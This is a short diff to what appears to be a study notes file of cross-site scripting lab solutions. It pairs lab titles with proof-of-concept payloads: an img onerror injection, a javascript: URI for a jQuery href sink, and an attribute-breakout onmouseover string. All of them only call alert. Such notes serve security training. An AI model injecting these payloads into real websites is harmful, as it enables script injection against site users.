@@ -11,3 +11,9 @@ mypayload<img src='x' onerror='alert(1)'>
 DOM XSS in jQuery anchor href attribute sink using location.search source
 
 javascript:alert(document.domain)
+
+
+Reflected XSS into attribute with angle brackets HTML-encoded
+
+"onmouseover="alert(1)
+
